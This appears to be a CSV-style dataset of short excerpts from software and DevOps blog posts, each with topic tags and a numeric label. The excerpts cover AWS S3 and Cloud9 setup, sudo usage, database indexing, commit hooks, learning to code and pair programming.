1295,"As a web developer, I can attest to the following scenario being not too uncommon: A new client comes to me complaining that their existing web site is too slow. Of course, many factors can influence a sites pageload time. Often, its not just a single one of these, but rather a combination of various issues. (It the problem were easy, they probably would not have had to contact me. )Broadly speaking, though, one could say that two main areas frequently come into play: (1) the software, and (2) the server(s). Within those two areas (again, very broadly speaking), a number of possibilities exist in terms of combinations. Lets consider a chart of the most common combinations:(Please note: The above is highly simplistic! Im not currently considering other factors such as traffic volume, CDNs, design / page sizing, etc. )Zone 1, above, is where new clients often first seek out developers or consultants, which makes a lot of sense, when you think about it, as it likely represents the normal growth of a smaller enterprise or web site. What happens is that: (a) on the software front, the site implemented some out-of-the-box solution that worked well for a small site. This also (b) worked out acceptably on a shared-host type situation because the site started out small and really didnt require the resources of an expensive hosting solution.","['Web Development', 'Web Design', 'Web Hosting', 'Programming', 'Software Development']",17
1296,"Its amazing how often these slow queries muck up the works of otherwise decent software. I see it a lot in solutions that are meant to cater to a very wide range of user needs, but where the slow site in question does not need most of the functionality offered by the software. So, youre in a situation where the queries are needlessly complex and slow down a site when you try to scale upward exponentially. (Also, youre then maintaining a code base that is largely unneeded, yet one that also might cause issues on your site even if an update to an unneeded function contains an error. )Also amazing is how truly scalable database applications become once theyre either optimized or custom coded. Instead of 10,000 relational database records being completely unworkable, you now can 100,000 relational database records barely strain any server resources. In keeping with the animal metaphors herein, I picked a fox for this one because (IMHO) this represents possibly the most clever take. Here youre running a normal business site (often an Intranet) where the hosting requirements are fairly low, cheap, and easily maintainable (e.g., no server admin needed, managed servers, nothing your normal c Panel cant handle, etc. ), and yet youre working with fairly massive loads of data. The only difference is that, because your code is fully optmized, and/or custom to your needs, theres no need for that workhorse server anymore (or the server admin and extra time he/she needs), unless of course you absolutely need to get into advanced pagespeed optimizations. But, for many normal sites, it can be a real sweet spot. For custom-scripted solutions, youre also, at this point, usully saving a good bit of money and/or frustration for updates on these other less-optimized systems.","['Web Development', 'Web Design', 'Web Hosting', 'Programming', 'Software Development']",13
1297,"Pro Tip Its also important to consider where you store data. In some cases, its better (or required) to store data in a specific region. After entering in the information above, youll want to enable encryption to Automatically encrypt objects when they are stored in S3. Again, this should be a mandatory best practice when working with any customer data in S3. Lastly, ensure you dont make the bucket publicly accessible (for obvious reasons). Once youve finished creating the bucket, you should see the following in your console.","['AWS', 'Incident Response', 'Information Security']",7
1298,"Once youre at the IAM page, we need to create a policy. Go to policies and Create policies. Once at the Create policy window, go to the JSON tab and lets paste in the following JSON below to get us going, replacing __url__ with your bucket name: Details about these permissions can be found here: __url__ CLI.","['AWS', 'Incident Response', 'Information Security']",7
1299,"If we try to change buckets from the dropdown, we will get an error as expected, since the policy defined on this user account limits our access (as outlined below): Linux/Mac OS: __url__ improvements!https://en.wikipedia.org/wiki/Amazon_S3.","['AWS', 'Incident Response', 'Information Security']",15
1300,"One useful metric is the distribution of defect age which we can call the shape of the data, as it quite literally corresponds to the geometric curve of a defect age graph. This shape can give us critical insights: What is the average age of your open bugs and what is the median? Are the mean and median significantly different? If so, this would imply that your distribution is a lot of young bugs, and some much older bugs. Is it a short tail (everything is fixed quickly) or a long tail (a small number of defects hang around for years)? Is the pace of new defect creation increasing or decreasing over time? This defect velocity may bode poorly if development work is introducing, rather than fixing, more bugs over time.","['Software Development', 'Bugs', 'Project Management', 'Quality Assurance']",14
1301,"Being metrics-driven, by definition, narrows the focus of the organization to the metrics it deems the most important. It is sometimes possible to have projects that improve one metric and have no impact on the rest of the software product, but this is the exception rather than the rule. Software engineering is all about tradeoffs, and focusing on a metric is very likely to produce engineering decisions that trade off other metrics for the one you picked. One way to get around this is to have counter metrics that will show you when youve gone too far in one direction. For example, when adding features to a product to improve engagement, it may be useful to also track metrics that would suffer if the product became too bloated or complex (e.g., app download size). Unfortunately, having too many metrics can be confusing and make metric design even more resource intensive.","['Product Management', 'Metrics', 'Engineering', 'Engineering Mangement', 'Backend Development']",12
1302,"Early on in my technical career, a manager recommended I read Zen and the Art of Motorcycle Maintenance by Robert Pirsig. I found it to be a thought provoking narrative that deals with the struggle for Quality even though you may not know exactly how to define it. Since then the idea of Quality has been a subconscious part of my decision making process. In this article Ill talk about the role of Operations in the area of software application maintenance, and try to relate it back to the central theme of Quality. All quotes shown here are taken from Mr. Pirsigs book.","['DevOps', 'Operations', 'Software Development', 'Software', 'Metrics']",12
1303,"At its core, the goal of operations is to plan, implement, and achieve productivity, quality, and cost targets. Our job is not to just keep the lights on, its to keep them running at peak efficiency. There should be no brown outs, burnt out bulbs, or dark shadowy corners. When done right, all our hard work makes it appear as if no work were required at all. We are not generally thought of as software architects, but we need to know how everything fits together. Nor are we black box testers who operate on the inputs and outputs of an application. We sit at the pragmatic intersection of design and implementation.","['DevOps', 'Operations', 'Software Development', 'Software', 'Metrics']",1
1304,"Consider the role of operations when looking at the two pictures below. The patent application on the left is much like an architecture diagram commonly provided by application vendors. It shows an idealized view of how the application should be constructed. Contrast that with the picture on the right, which represents the users view of the application. In operations, we fit somewhere in the middle. We need to understand how the machine works and the how it is currently used in order to ensure the application functions correctly.","['DevOps', 'Operations', 'Software Development', 'Software', 'Metrics']",12
1305,"Good commit guidelines provide more benefits than might first come to mind. These benefits are not just for yourself as a maintainer, but for your entire team as well as your future team members. A good commit message guideline will:give context about the what and most importantly the why of your commitsmake working with your commit history easier and more systematic (i.e. readability, search-ability, debugging, investigating issues, etc. )help you spot commits that lack separation of concernslower the entry level for new contributors by making the commit history consistent and easy-to-followmake you a more disciplined engineer and a more empathetic project maintainerhelp you generate change logs The developer community has plenty of great best-practices in place when it comes to what makes a good commit message and what doesnt. But ultimately, it is up to you to decide if they work for your project or if youd rather define your own set of rules. Whatever you decide, just remember that choosing a set of guidelines and announcing them to the world wont guarantee that contributors will actually abide by them. This is not to say that people are ill-intentioned, but sometimes people forget, or are unaware that such guidelines even exist. If you want to make sure that what ends up in the repository is exactly how you want, then you might want to consider automation.","['Git', 'Git Commit Messages', 'Commitizen', 'Git Commit Guidelines', 'Git Best Practices']",18
1306,"With that in place, the next step is to figure out what script you want to run to validate the commit messages. I personally prefer using commitlint for its simple and declarative commit rules configuration, but you can also write your own custom script based on the needs of your project. Whichever you choose, the end workflow will look something like this: There are not many disadvantages I can think of for this approach. One thing that might be inconvenient when you use husky is the extra third-party dependency(ies) you are adding to your project, including possibly the dependency on npm itself if you are working on non-Javascript projects and are relying on different package managers. Another downside is that a Git commit message hook can only validate the message after the fact which can introduce a considerable overhead in the feedback loop. If you want to make sure that contributors dont have to wait until the hook passes or fails their commit, but rather give them feedback as they write the commit message, then Commitizen might be a good tool of choice.","['Git', 'Git Commit Messages', 'Commitizen', 'Git Commit Guidelines', 'Git Best Practices']",18
1307,"Cloud9 is a development IDE that runs in the browser, allowing you to edit, run, and test code remotely. The Cloud9 software runs on the server, and you access it through the browser. Cloud9 started as an independent company and product, and AWS recently acquired them. Now you can use Cloud9 to edit code that runs on your EC2 instances. In order to access it, you have to log into the AWS console. The instructions for starting a new EC2 instance with Cloud9 are pretty straightforward; but in this article, Ill show you how to set it up on an existing EC2 instance, as there are a couple things you need to take care of.","['AWS', 'Ec2', 'Amazon Web Services', 'Cloud9', 'Ide']",7
1308,"Use case: I like to be mobile, and take my laptop with me and work from different locations. But I dont like to store much on my laptop in the event it gets stolen. Instead, I maintain an EC2 instance that serves as my development machine. I access it through ssh, giving me all my usual Linux command line tools. There are some excellent editors that I use in the terminal aside from the old standbys such as vim; one that I like is called micro. But I also like to use a full-featured IDE.","['AWS', 'Ec2', 'Amazon Web Services', 'Cloud9', 'Ide']",7
1309,"Most of the IDE itself is written in node.js, but there are also some python tools involved, especially in the way Cloud9 interacts with the AWS infrastructure. Also, the AWS console needs to be able to communicate with your server; thats where the authorized_keys file comes in. (More details below when we get to that step. )As for roles and policies, Ill be blunt: If youre going to use AWS at all, you must have a good understand of roles and policies. If you dont, not only could you potentially open up too many security holes, but youll also find yourself struggling to understand when and why certain things happen. For example: Want to access S3 from an app running on one of your EC2 instances? You can grant the EC2 instance itself permission without having to store a private key on your server. In our case, Cloud9 can be used for managing your AWS Lambda functions, and that requires the appropriate Lambda permissions. There are different ways of accomplishing this. Well cover that in a separate article devoted to Lambda and Cloud9.","['AWS', 'Ec2', 'Amazon Web Services', 'Cloud9', 'Ide']",10
1310,"This is so the IDE can communicate with the AWS resources. To do so, ssh into your server and run: Or replace apt with the appropriate package manager for your distribution. Then test the installation: There are different ways to install node.js. I personally like to use the Node Version Manager. Its an easy way to either keep up with the latest version of node, or to maintain multiple node installations. (Its also just plain easier to install than node itself.) To install it, head over to the NVM page on github, scroll down to the Installation section, copy the curl command (or the wget command if you prefer that tool), log into your EC2 instance via ssh, and paste the command and run it. (That github page always has the latest version in the command, so youll want to copy it verbatim.) For example, heres the github page as I currently see it: And then here I am pasting it into my terminal: Now exit and log back in; this re-runs your login profile to pick up changes nvm added to it.","['AWS', 'Ec2', 'Amazon Web Services', 'Cloud9', 'Ide']",7
1311,"AWS automates the installation of Cloud9. Head over to the Cloud9 Console for the region youre using by clicking on the Services link in the AWS console; then find Cloud9 in the list or just type Cloud9 in the service search box: Then youll arrive at the Cloud9 console: Click the Create environment button and youll arrive here: Enter a unique name. The idea here is that you can have multiple environments among your various instances, and this name will help you keep straight which is which.","['AWS', 'Ec2', 'Amazon Web Services', 'Cloud9', 'Ide']",7
1312,"Before proceeding, think carefully about what is happening here: IDE software will be running on your server. How will you be interacting with that software? Well, normally that would require you open up a port such as 80 for the web browser to communicate with your server. But thats not how Cloud9 on AWS does it. Instead, when you run the IDE, your browser will be communicating with one of AWSs own servers. That server will in turn communicate with the Cloud9 code running on your server, which will allow you to modify your code. That means you do not need to open up a port through a security group for this server other than port 22. But you should already have done that since I mentioned you need SSH access to your server.","['AWS', 'Ec2', 'Amazon Web Services', 'Cloud9', 'Ide']",11
1313,"So now enter the SSH information. For the user, I use my own user that I created on my EC2 instance so that I can access the code in my home directory. But if you like, you can create a separate user with minimal access, and put your source code in an area where that user has access. For the host, you will likely want an Elastic IP address associated with your instance, which you would enter here. It must be a public IP address, not a private one, as AWSs own server wont have access to your virtual private cloud. This is similar to what youll see, but with your own data filled in. The key is generated automatically: Click the Copy key to clipboard button. This is the key that youll put on your server to provide access.","['AWS', 'Ec2', 'Amazon Web Services', 'Cloud9', 'Ide']",7
1314,"Back in the Cloud9 console, click Advanced settings. Here youll fill in a path to the area in your directory where your code files are. This can be your home path or a path to a development directory, or a path to a specific project; whatever you like. For the __url__ binary path, find the exact path to the binary. Because I use nvm, the binary isnt in the path by default. Instead, determine where it is from the SSH console, and paste it in by typing: Tip: If like me youre using nvm and have multiple node installations, first choose the most recent before calling which node: In either case, take the results, which might look something like this:and paste it into the N __url__ binary path textbox.","['AWS', 'Ec2', 'Amazon Web Services', 'Cloud9', 'Ide']",7
1315,"To do so, head over to the Cloud9 Environments page in the console. Click the name of the environment shown at the top of the card, as in Develop or Cloud9Test2 in the image below: A new screen will open showing the details for the environment. Click the Edit button in the upper right. Scroll down and youll see SSH settings just as when you created the environment. Simply paste in the revised IP address in the Host box: Click the Save Changes button underneath and youll be good to go.","['AWS', 'Ec2', 'Amazon Web Services', 'Cloud9', 'Ide']",7
1316,"Following the leaf node chain requires getting ROW IDs that fulfill the customer_id condition: in our case, it has max limit of 200 row IDs. Since these index leaf nodes are stored in a sorted manner, their access is upper bounded by the length of this chain or total rows in the table. The next step is the TABLE ACCESS BY INDEX ROWID operation. It uses the ROWID from previous step to fetch the rowsall columnsfrom the table. Here the db engine must fetch the rows individually hitting each record in page and bringing them in memory for retrieval. It involves random access IOs apart from read operations. We decided it might be worthwhile to look at how these query result rows were distributed on physical memory. In postgres, location of a row is given by ctidwhich is a tuple. ctid is of type tid (tuple identifier), called Item Pointer in the C code. Per documentation: This is the data type of the system column ctid. A tuple ID is a pair (block number, tuple index within block) that identifies the physical location of the row within its table.","['Sql', 'Postgres', 'Slow Indexes', 'Spark', 'Repartition Spark']",8
1317,"The distribution was like this: Clearly, rows for a particular customer id were far from each other on disk. This seemed to explain the high execution times of queries having customer_id in WHERE clause. The db engine was hitting pages on disk for retrieving each row. There was high random access IO. What if we could bring all rows of a particular customer together? If done, the engine might be able to retrieve all rows in result set in one go.","['Sql', 'Postgres', 'Slow Indexes', 'Spark', 'Repartition Spark']",8
1318,"This optimization really helped us use personalized recommendations to serve a variety of use cases like generating targeted advertising pushes for a growing consumer base of more than 1lakh users in bulk etc. When this was first launched, size of the data was ~12 GB. Now in the past 1 year, it has grown to ~22GB but rearranging the records in the table has helped to keep database retrieval latencies to minimal. Although now, the time taken for Spark application to generate these recommendations, arranging the dataframe and writing to database has increased manifold. But since that happens in batch mode, it is still acceptable. As the data grows and the use cases to serve it, there will be many more challenges to solve.","['Sql', 'Postgres', 'Slow Indexes', 'Spark', 'Repartition Spark']",8
1319,"Lets take Docker as an example (disclaimer: they have not been a client, to-date). Check out this article on Infoworld. The article divides up into the Good and Bad about Docker, quoting CEOs and developers who use Docker and build a case for and against Docker. Potential Docker customers are going to come to this website, skim through it, and look at some of the key terms. Theyll see that its called simple and has great developer support. But, theyll also see that implementing it can be complicated and its not really versatile for diverse workloads.","['Tech Consulting', 'Developer', 'Feedback', 'Innovation']",10
1320,"Designing a flexible architecture is also well adapted to agile development methodologies, where decisions regarding the various system components can be delayed until necessary. A flexible architecture allows interfaces that integrates with both current and future components. This also mitigates risk, as the most complex system components can be prioritized early. Thus, not all requirements need to be set in stone before development can start. Note however, that it is essential to ensure that the architectural viewpoint is further away than only the next iteration. This is to avoid implicitly growing an organic system where changes will be expensive.","['Software Development', 'Software Architecture', 'DevOps', 'Agile Development']",12
1321,"Now, imagine that Im a system running in a cloud. There are thousands of me running there, all doing that weird sprinting thing at 3 AM. Three weeks turns into every night. People say theyll get around to fixing me, but they have other, higher priority things to deal with. And my thousands of sprinting systems are paging the on-call every night.","['Cloud Computing', 'DevOps', 'Kpi', 'Metrics And Analytics']",1
1322,"Remember the 5 9s of availability? Less than 6 minutes of downtime per year? An error budget for that SLA likely exists, its just razor-thin. Averaging more than 13.14 seconds of downtime per day will eventually breach that SLA. An error budget might be a quarter of that. Anything more than 2 seconds of downtime per day would page somebody (Its probably even lower).","['Cloud Computing', 'DevOps', 'Kpi', 'Metrics And Analytics']",10
1323,"Most people new to software development, including me, think that code is written for machines. The machine doesnt even see the Java Script code that you write, all they see is a sequence of 0s and 1s. And as the service for my team was being built up, there were real deadlines with deliverables that had to be delivered. Software developers are already very mentally taxed. Somewhere in the pressure to deliver, getting the code to work takes priority over writing super aesthetically pleasing code.","['Software Development', 'Technology', 'Code', 'Business Software', 'Software Engineering']",9
1324,"In the world of business, where there might be clients depending on your product or service. No one cares if your code is refactored to the best possible extent. Every line of code is written to solve a business problem. Ask yourself, what value will your refactoring efforts create? Possibly none, and they might end up introducing more bugs. Plus, is it the best use of your time? The first step is to recognize the problem. The issue was my ego was thinking it could do a better job than these senior developers who clearly didnt know how to write production level code. This is a very naive way of thinking, and I have been burnt sufficient times in the past to avoid it now.","['Software Development', 'Technology', 'Code', 'Business Software', 'Software Engineering']",9
1325,"S. are women, according to Department of Labor. The situation is better among computer programmers, but not much. Women account for only 26% of all American coders. In the wake of these findings, tech companies have done some soul-searching and are actively looking for ways to become more inclusive. This involves policies such as supporting womens education, active recruiting, and creating a welcoming environment.","['Women In Tech', 'Gender Equality', 'Workplace Culture', 'Workplace Diversity', 'Gender Diversity']",12
1326,"For those reading this who come from a non-technical background (hey mom, hey dad! ), pair programming (aka pair-coding) occurs when two developers (aka programmers aka coders aka computer engineers) are assigned to work on the same piece of code together using a particular method. The method of pair-programming requires that two programmers work on the same code, at the same time, on the same computer. In pair-programming, one programmer is the navigator and the other is the driver. The navigator is in charge of the big picture. They are looking at the problem at hand, thinking about the best strategies for solving it, and communicating these strategies to the driver. The driver has hands on the keyboard. Drivers are listening to the navigators strategies and turning them into code. Additionally, the driver is asking clarifying questions. The navigator does view the computer screen and does read the code as it is entered. The navigator is thus able to check for errors and to help guide the entry of the code. These roles are often blurred and teams figure out what works best for them.","['Women In Tech', 'Gender Equality', 'Workplace Culture', 'Workplace Diversity', 'Gender Diversity']",5
1327,"Suggestion One: Being aware of a problem and self-monitoring is helpful. However, studies have shown that even those who are aware of the problem find it very well difficult to break habits after so much early-life conditioning. Some men, even with the best intentions are completely unaware that they are engaging in behavior that diminishes the voices of women. Being proactive will help you break this habit faster. Tell your female (or non-female) partner that you are trying not to interrupt and that you want them to point out to you whenever you do interrupt. This not only helps you break your habit, it also makes it comfortable for your coding partner to speak up.","['Women In Tech', 'Gender Equality', 'Workplace Culture', 'Workplace Diversity', 'Gender Diversity']",4
1328,"An aside for women: Women, if youre in a situation in which you notice a pattern of being interrupted, but are anxious about adding social tension to your pairing relationship, try adding a dude in front of thats the third time youve cut me off in the last 20 minutes. Is it ridiculous that it takes bro-ing to feel comfortable advocating for yourself? But Ive found it to be a highly effective strategy. The familiarity and levity make the confrontation less awkward. Side note: I try to avoid gendered language (guys, ladies, dude, etc) but have not found another a replacement for dude that has the same effect. The Problem: Confidence Gap Reshma Saujani, founder of Girls Who Code, summarized the problem with the gender gap during a Ted Talk when she said were raising our girls to be perfect, and were raising our boys to be brave. That is, we are telling women not to take risks because taking risks means greater chance of failure and imperfection. On the other hand, we tell boys that risk is good and if you fall down, get up and try again. For example, a Hewlett-Packard study found that women applied for a promotion only when they had met 100 percent of the qualifications listed for the job. Men applied when they thought they could meet 60 percent of the job requirements.","['Women In Tech', 'Gender Equality', 'Workplace Culture', 'Workplace Diversity', 'Gender Diversity']",4
1329,"In the tech world, this conditioning causes two problems for women. First, a risk-free environment is not the ideal for innovation and cutting edge tech. Second, the self-doubting nature of women causes others around them to feel less confident in their abilities. The Pygmalion Effect reinforces this lack of self-confidence. (The Pygmalion Effect is the finding that the expectations that people have for a person affects persons performance. In simple terms, if I think youre competent, youll internalize this and do well. Likewise, if I think youll do poorly, you will. For example, a recent study from the Center for American Progress concluded that a teachers expectations for their students are strongly correlated with students graduation rates.) Women in early life are trained to be cautious and uncertain. Men perceive this caution as weakness and incompetence. Because of these expectations, women perform under their abilities. It is a vicious cycle that puts competent women at a huge disadvantage in terms of succeeding and moving up in the company.","['Women In Tech', 'Gender Equality', 'Workplace Culture', 'Workplace Diversity', 'Gender Diversity']",4
1330,"Suggestion One: Make space for your female coworkers ideas by asking questions. Ask your partner what she thinks? How would she tackle the problem? Dont make it easy for her to acquiesce. I have had male colleagues push me out of my comfort zone and insist that I put my ideas out there. It felt really awkward at first, but it gave me confidence that my ideas were good, valued, and worth investigating.","['Women In Tech', 'Gender Equality', 'Workplace Culture', 'Workplace Diversity', 'Gender Diversity']",0
1331,"The Problem: Playing defense Hey, Im one of the good guys! This is a common response when bringing up a behavior that makes women uncomfortable. If youre reading this in the hopes of making the the workplace more welcoming, you certainly do have good intentions. But whats that they say about the road to hell? The point Im laboring to make is that just because you are well-meaning doesnt mean that you are immune from making mistakes or from acting on unconscious bias. We all have unconscious bias that creeps up and affects how we treat people. Having bias does not make you a bad person. It makes you a human that grew up in a society that repeatedly tells us that there is a value difference dependant on gender, sexual-orientation, religion, and race. And even if we subscribe to these values, we unconsciously (unconsciously!) act in ways that reinforce this system. When a woman brings these to a male colleagues attention, she is often met with outrage that someone might think that he is sexist. It puts you and your colleague at odds and will result in a strained relationship. The male colleague will feel attacked and the female will feel voiceless. This will not lend itself to a easy pair-programming relationship.","['Women In Tech', 'Gender Equality', 'Workplace Culture', 'Workplace Diversity', 'Gender Diversity']",4
1332,"Suggestion One: Take a moment to process before reacting. Try to understand why your action lead your colleague to feel uncomfortable. You are good person, but you may be unaware of what you are unconsciously doing. Constructive criticism will help make you a better person.","['Women In Tech', 'Gender Equality', 'Workplace Culture', 'Workplace Diversity', 'Gender Diversity']",4
1333,"Suggestion Two: Remember that confronting someone is not easy. And that there are often consequences for doing so. In the end, most people dont want to sit through hours of one-on-one programming with someone they have a strained relationship with, so it was not an easy decision to talk to you. Work together on a strategy to ensure that the problem does not repeat itself. Your open and proactive attitude will foster a positive relationship. Instead of being seen as a hindrance to workplace inclusivity, youll be an ally! I have found that pair-coding can be one of the most rewarding experiences in coding. Unfortunately, societal conditioning can make pair-coding a daunting experience for women, and perpetuate and amplify the disadvantages that women suffer. The result is a paucity of women coders. There are ways to make the pair-coding experience a better one for women. This will not only help bring more women into the coding family, but it will help to take advantage of their knowledge, skills, and creativity once they are there. It is my hope that some of these suggestions will reach friendly ears.","['Women In Tech', 'Gender Equality', 'Workplace Culture', 'Workplace Diversity', 'Gender Diversity']",4
1334,"None of these have due dates, but were rolling every two weeks. When we roll v1.1, we remove that landing area and add a new landing area v1.3 between v1.2 and v1.x. We take the initiatives that didnt make 1.1 and move those into 1.2. If 1.2 overflows, we push stuff out of 1.2 into an empty 1.3. Then we fill the rest of 1.3 with stuff from 1.x. Then we keep moving stuff to the left as it makes sense.","['Startup', 'Entrepreneurship', 'Business', 'Product Management', 'Technology']",1
1335,"Now, there are two methods of deploying an IPFS Cluster Service. Which method you favour will depend on your deployment methods. They are as follows: Method 1: To configure your entire cluster peerset and list them in the configuration file of your initial cluster node. Deploying a cluster service on this node will then sync the remaining peerset nodes to the cluster. This method is favourable for automated solutions with tools such as Ansible, whereby your deployment is run as an automated process. It is documented in more detail here.","['Ipfs', 'Software Engineering', 'Programming', 'Development', 'Distributed Systems']",11
1336,"By peeking into an actual controller file, youll see these controllers are made up of CRUD (create, read, update, delete) methods that make database queries and/or request action to occur with the database via the model. That information is then sent to the View via an instance variable or instance variable(s): Now lets pry into the model. Within the model, youll typically find queries accessing specific statistics from your database. Youll also see attribute and relationship validations that keep your database clean, normalized, and properly interconnected. You must be very cognizant of your method return values in your model. Your return values become the way your model responds to a controller. These return values will be saved as instance variables in your controller and ultimately passed into your view. A return value of a particular object versus an array of objects will need to be treated differently within the View in order for the display to look as intended.",['Web Development'],15
1337,"Last but certainly not least is our view. The views functionality is relatively self-defined. The view renders HTML code to display specific pages on the website. The data displayed in the view is presented as instance variables delivered from the controller. The view has some logic written in as well to determine under what circumstances data should display, but for the most part, the view is simply for displaying information in a particular format or design. Youll typically see a fair amount of enumerating in the view for those instance variables holding collections.",['Web Development'],19
1338,"The architecture identifies, selects, and composes candidate response elements into a coherent and meaningful query result. The architecture also implements an adaptable delivery mechanism that is responsive to connection bandwidth, query source preferences, query source characteristics, and other factors. Feedback from multiple sources adapts the architecture for handling subsequent queries The architecture implements technical solutions to many difficult technical problems in the field of automatically generating meaningful query responses given extensive and impossible to manually search data stores of potentially relevant information. A few examples of the technical solutions are summarized next. The architecture provides a personalization mechanism for answering questions, responsive, as examples, to: the role and perspective of the person asking the question; timing considerations; context; session history, including prior queries and responses, query and response history from others with similar characteristics to the querying entity, such as other enterprise engineers or managers; and other factors. The architecture may also identify explicitly and implicitly referenced entities in the input query and use the identified entities in its search for candidate response elements.","['AI', 'Ideas', 'Technology', 'Tech', 'Innovation']",8
1339,"The sudo program itself is a setuid binary. If you examine its permissions, you will see: That s means that this is a setuid program. You and everyone else have execute permission on this, so you can run it. When you do that, because it is setuid and owned by root, your effective user id becomes root- if you could get to a shell from sudo, you effectively WOULD be root- you could remove any file on the system, etc. Thats why setuid programs have to be carefully written, and something like sudo (which is going to allow access to other programs) has to be especially careful.","['DevOps', 'Linux Tutorial', 'Commands', 'Developer Tools', 'Developer Productivity']",7
1340,"As previously mentioned, the sudo command can be used to run a command as any other user. For instance, if you are logged in as user Joe and you want to run the command as robert, then youd run the sudo command in the following way: If you want to try it out, create a new user called sudotest and run the following Whoami command: When you run a command using sudo, youll be prompted for your password. For a period afterward, you can run other commands using sudo without entering your password. If you wish to extend that period, run the following command: Consider a case where-in youve just run a sudo-powered command after entering your password. Now, as you already know, the sudo session remains active for 15-mins by default. Suppose during this session, you have to give someone access to your terminal, but you dont want them to be able to use sudo. Thankfully, there exists a command line option -k that allows user to revoke sudo permission. Heres what the sudo man page has to say about this option: There might be times when you work requires you to run a bucket load of commands that need root privileges, and you dont want to enter the sudo password every now and then. Also, you dont want to tweak the sudo session timeout limit by making changes to the /etc/sudoers file.","['DevOps', 'Linux Tutorial', 'Commands', 'Developer Tools', 'Developer Productivity']",7
1341,"Software engineering, the field we most commonly refer to when talking about learning to code, is based upon a foundation of computer science and applied mathematics. And while it is true that you dont need to be a mathematician or a computer scientist in order to be a software engineer, the another truth is that learning even basic programming concepts is hard for most people. In this article we will explore a little bit of learning theory, and how we can apply it to those just getting started with learning how to code. Ill lay out some of the advantages and disadvantages of concepts like the bottom up versus top down approaches to learning, as well as some alternatives that are worth considering. This content is aimed at newer programmers, but these concepts are applicable to anyone who is interested in learning more effectively, even if the topic isnt programming.","['Programming', 'Learning', 'Technology', 'JavaScript', 'Web Development']",2
1342,"Ive been a professional programmer for over 7 years, and I started messing around with code way earlier. If theres one thing that I can say confidently about this profession, its that the learning never stops, and it never gets any easier. Every time you master a difficult concept, you can be sure that another one is right around the corner. I spent a lot of my time early on reading obsessively about programming topics, mostly in the form of what shiny new framework was better than the old solution to the problem. I read about topics like whether or not I should use j Query or Moo Tools for my next website project. Frequently felt way out of my depth, like there was no way I could possibly understand any significant part of the web development ecosystem (and this was before the explosion of front-end solutions). Thankfully for you, people like me exist, with just enough perspective to help you steer clear of pitfalls and time sinks that wont help you effectively level up as a programmer.","['Programming', 'Learning', 'Technology', 'JavaScript', 'Web Development']",2
1343,"The concepts of top down and bottom up processing have been applied to a number of disciplines, but the one were most interested in is how top down and bottom up can be applied to learning. The general definition of top down learning is a process that immerses the learner in the full context of the subject matter. Put another way: if you were someone who was interested in learning how to swim, and I was someone interested in employing the top down method, Id throw you in to the pool. Conversely, the bottom up approach involves a process that is much more granular and theoretical. A bottom up approach to learning involves exposing the learner to the fundamental concepts of a subject matter in isolation. A bottom up approach to learning to swim would involve learning about fluid dynamics, anatomy and physics, but would not involve a pool.","['Programming', 'Learning', 'Technology', 'JavaScript', 'Web Development']",14
1344,"The bottom up approach enjoys a number of advantages. What I consider primary among them is that the learner is able to acquire a complete understanding of the subject, as long as they take the time to master each component part. Bottom up is also easy to structure: breaking a problem down into small, coherent fragments lends itself to organization. A teacher planning a bottom up approach to a curriculum already has to organize their material into small topics. In the world of programming, understanding a significant portion of any language, framework, or tooling is a long and difficult process. When learning a new language, a bottom up approach is useful for learners that need to understand a concept at a high level in order to feel confident about moving on to another concept. For example, learning the basics of Java Script using a bottom up approach might involve learning about primitive values like Numbers, Strings, Booleans, Arrays, and null/undefined, then moving on to Objects and Functions, before finally moving on to scoping and control flow. Ideally each concept would build on top of the previous concepts to create a nice progression.","['Programming', 'Learning', 'Technology', 'JavaScript', 'Web Development']",9
1345,"A top down approach to learning is particularly advantageous for some programming students because getting a chance to see how everything is working together is exciting. Personally, my interest in programming was sparked and maintained by resources that let me implement my own complete, (mostly) working projects. Initially this was messing around with making command line quizzes and adding functionality to games via scripts, but the common denominator here is that I probably wouldnt have even bothered if the only way to learn was one step at a time. Besides providing an incentive to learn, a top down approach is practical. For many learners, the goal is to learn only whats necessary to understand or implement a very specific concept. In this situation, a bottom up process would be overkill, and possibly even a waste of time.","['Programming', 'Learning', 'Technology', 'JavaScript', 'Web Development']",2
1346,"I think the solution comes in two parts. First, learning a new programming concept should involve coming up with the smallest possible practical application of that concept. For a developer trying to learn a new language, this might be a command line choose your own adventure, or an implementation of a simple game in the browser. Once you have a small, achievable goal in mind, learn the bare minimum of what you need to in order to implement that application, but work to master those concepts. If Im building a choose your own adventure, then Ill probably really need to dig in to standard inputs, standard outputs, and simple control flow in the language Im learning. Ideally, these types of small projects will be something you can complete in a day. That way, you never struggle for too long on a concept, and you continually will incentivize yourself to come up with new projects by the small successes you make on a shorter timeline.","['Programming', 'Learning', 'Technology', 'JavaScript', 'Web Development']",9
1347,"Using this approach we create functions to watch the specific values in the actions element. The key name tells us the desired action (slack, email, sms etc), and the value tells the state of that action (pending, failed or completed). When a function runs it needs to perform only its specific tasks (email, slack, s3 etc) and then it needs to set its status message; completed, failed or pending. The code will stop execution when failed or completed./invites/{id}/actions/twilio/pending/invites/{id}/actions/email/pending/invites/{id}/actions/hubspot/pending Self Contained The task status, database trigger, and task data are all located in the same place/path. Using the `parent.parent` allows the functions code to walk back up the ref to get the data it needs. This means that the function does not need to pull in data from other paths, which makes the code easier to manage, with fewer callbacks.","['Microservices', 'Firebase Cloud Functions', 'Firebase', 'Aws Sqs', 'Queue System']",15
1348,"Digitisation of those forms provided some big improvements over paper, of course. Transmission became instant, replacing the slow passage of the internal office memorandum envelope through cumbersome internal mail systems. Data consistency could be promoted through the use of selection menus and field data entry rules. Buttons and other controls allowed more intricate interaction with the interface. But the design was still effectively nothing more than a dumping of some or all of the columns of a database record onto the screen, rendered in the style of a paper from. User experience wasnt a primary consideration: it was about data first and foremost.","['UX', 'Tickets', 'Itsm', 'DevOps']",16
1349,"Weve done the same for the service agents who support them. The phrase Sorry, Ive just got to take down some details is remarkably common in service engagements. You hear it more than you realise. Its a painful example of the form representation of the service ticket actually being a driver for sub-optimal behaviour. After observing its use time after time in service desk observation sessions, we responded by reducing the incident logging interface to a single input field. Removing the complexity from these interactions, in favour of a formless interface, abstracts away the database row and significantly improves peoples day. The interface fits the users task. The system does the data entry.","['UX', 'Tickets', 'Itsm', 'DevOps']",0
